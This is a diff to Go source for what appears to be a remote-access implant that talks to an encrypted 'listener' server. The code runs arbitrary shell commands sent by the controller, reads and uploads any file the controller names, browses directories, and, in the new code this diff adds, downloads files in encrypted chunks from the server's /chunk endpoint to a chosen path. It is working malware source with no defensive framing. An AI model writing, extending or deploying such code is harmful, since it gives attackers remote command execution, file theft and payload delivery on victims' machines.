@@ -9,7 +9,6 @@ import (
 	"crypto/sha256"
 	"crypto/x509"
 	_ "embed"
-	"encoding/base64"
 	"encoding/json"
 	"encoding/pem"
 	"fmt"
@@ -24,7 +23,6 @@ import (
 	"runtime"
 	"strconv"
 	"time"
-
 )
 
 //go:embed listener.pub
@@ -139,12 +137,12 @@ func processTasks(tasks []*Task) {
 		case 1: // Shell
 			output, execErr = executeShellCommand(string(task.Arguments))
 		case 2: // Download
-			execErr = handleDownloadTask(task.Arguments)
+			execErr = handleDownloadTask(task)
 			if execErr == nil {
 				output = []byte("File downloaded successfully.")
 			}
 		case 3: // Upload
-			output, execErr = handleUploadTask(task.Arguments)
+			output, execErr = handleUploadTask(task)
 		case 4: // Exit
 			log.Println("Received exit command. Terminating.")
 			os.Exit(0)
@@ -188,7 +186,7 @@ func processTasks(tasks []*Task) {
 				}
 			}
 		case 6: // Browse
-			output, execErr = handleBrowseTask(task.Arguments)
+			output, execErr = handleBrowseTask(task)
 		default:
 			execErr = fmt.Errorf("unknown command ID: %d", task.CommandID)
 		}
@@ -287,6 +285,11 @@ func doPost(url string, body []byte) ([]byte, error) {
 	encryptedBody, err := io.ReadAll(resp.Body)
 	if err != nil {
 		return nil, fmt.Errorf("failed to read response body: %v", err)
+	}
+
+	// An empty body can be a valid response (e.g. for task output)
+	if len(encryptedBody) == 0 {
+		return nil, nil
 	}
 
 	return decrypt(encryptedBody)
@@ -419,32 +422,88 @@ func executeShellCommand(command string) ([]byte, error) {
 	return cmd.CombinedOutput()
 }
 
-func handleDownloadTask(args []byte) error {
-	var taskArgs struct {
-		DestPath string `json:"dest_path"`
-		FileData string `json:"file_data"` // base64 encoded
+func handleDownloadTask(task *Task) error {
+	// 1. Parse metadata from arguments
+	var args struct {
+		Source      string `json:"source"`
+		Destination string `json:"destination"`
+		FileSize    int64  `json:"file_size"`
+		ChunkSize   int    `json:"chunk_size"`
 	}
-	if err := json.Unmarshal(args, &taskArgs); err != nil {
-		return fmt.Errorf("could not unmarshal download args: %v", err)
+	if err := json.Unmarshal(task.Arguments, &args); err != nil {
+		return fmt.Errorf("could not unmarshal download metadata: %v", err)
 	}
 
-	fileData, err := base64.StdEncoding.DecodeString(taskArgs.FileData)
+	if args.ChunkSize == 0 {
+		return fmt.Errorf("chunk size cannot be zero")
+	}
+
+	// 2. Create temporary file
+	tempFilePath := args.Destination + ".tmp"
+	destFile, err := os.Create(tempFilePath)
 	if err != nil {
-		return fmt.Errorf("could not decode file data: %v", err)
+		return fmt.Errorf("could not create temporary file %s: %v", tempFilePath, err)
+	}
+	defer destFile.Close()
+
+	// 3. Calculate total chunks and loop
+	totalChunks := (args.FileSize + int64(args.ChunkSize) - 1) / int64(args.ChunkSize)
+	log.Printf("Starting download of %s to %s. Total size: %d bytes, Chunks: %d", args.Source, args.Destination, args.FileSize, totalChunks)
+
+	for i := int64(0); i < totalChunks; i++ {
+		// 4. Request chunk from listener
+		chunkReqMap := map[string]interface{}{
+			"task_id":      task.TaskID,
+			"chunk_number": i,
+		}
+		chunkReqBody, _ := json.Marshal(chunkReqMap)
+
+		encryptedReq, err := encrypt(chunkReqBody)
+		if err != nil {
+			os.Remove(tempFilePath) // Cleanup
+			return fmt.Errorf("failed to encrypt chunk request for chunk %d: %v", i, err)
+		}
+
+		// The raw chunk data is returned encrypted, so we must decrypt it
+		encryptedChunkData, err := doPostAndGetRaw(serverURL+"/chunk", encryptedReq)
+		if err != nil {
+			os.Remove(tempFilePath) // Cleanup
+			return fmt.Errorf("failed to download chunk %d: %v", i, err)
+		}
+
+		chunkData, err := decrypt(encryptedChunkData)
+		if err != nil {
+			os.Remove(tempFilePath) // Cleanup
+			return fmt.Errorf("failed to decrypt chunk %d: %v", i, err)
+		}
+
+		// 5. Write chunk to file
+		if _, err := destFile.Write(chunkData); err != nil {
+			os.Remove(tempFilePath) // Cleanup
+			return fmt.Errorf("failed to write chunk %d to temporary file: %v", i, err)
+		}
+		log.Printf("Downloaded and wrote chunk %d/%d", i+1, totalChunks)
 	}
 
-	log.Printf("Writing %d bytes to %s", len(fileData), taskArgs.DestPath)
-	return os.WriteFile(taskArgs.DestPath, fileData, 0644)
+	// 6. Rename file
+	if err := os.Rename(tempFilePath, args.Destination); err != nil {
+		os.Remove(tempFilePath) // Cleanup
+		return fmt.Errorf("failed to rename temporary file to %s: %v", args.Destination, err)
+	}
+
+	log.Printf("Successfully downloaded file to %s", args.Destination)
+	return nil
 }
 
-func handleUploadTask(args []byte) ([]byte, error) {
-	sourcePath := string(args)
+
+func handleUploadTask(task *Task) ([]byte, error) {
+	sourcePath := string(task.Arguments)
 	log.Printf("Reading file from %s to upload", sourcePath)
 	return os.ReadFile(sourcePath)
 }
 
-func handleBrowseTask(args []byte) ([]byte, error) {
-	dirPath := string(args)
+func handleBrowseTask(task *Task) ([]byte, error) {
+	dirPath := string(task.Arguments)
 	log.Printf("Browsing directory: %s", dirPath)
 
 	absoluteDirPath, err := filepath.Abs(dirPath)
@@ -482,6 +541,28 @@ func handleBrowseTask(args []byte) ([]byte, error) {
 
 	return []byte(absoluteDirPath + "\n" + string(jsonOutput)), nil
 }
+
+// doPostAndGetRaw is a variant of doPost that returns the raw (but still encrypted) response body,
+// without trying to decrypt it. This is needed for downloading file chunks.
+func doPostAndGetRaw(url string, body []byte) ([]byte, error) {
+	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(body))
+	req.Header.Set("Content-Type", "application/octet-stream")
+	req.Header.Set("X-Session-ID", sessionID)
+
+	resp, err := http.DefaultClient.Do(req)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		respBody, _ := io.ReadAll(resp.Body)
+		return nil, fmt.Errorf("request failed with status %s: %s", resp.Status, string(respBody))
+	}
+
+	return io.ReadAll(resp.Body)
+}
+
 
 // parseInt32 解析字符串为int32
 func parseInt32(s string) (int32, error) {
